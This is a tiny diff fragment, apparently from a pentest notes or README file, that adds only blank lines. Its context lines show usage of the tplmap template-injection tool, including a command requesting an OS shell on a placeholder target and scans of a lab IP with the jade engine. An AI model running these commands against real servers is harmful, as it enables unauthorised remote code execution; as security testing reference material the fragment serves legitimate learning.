@@ -16,3 +16,5 @@ python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
 ```
+
+
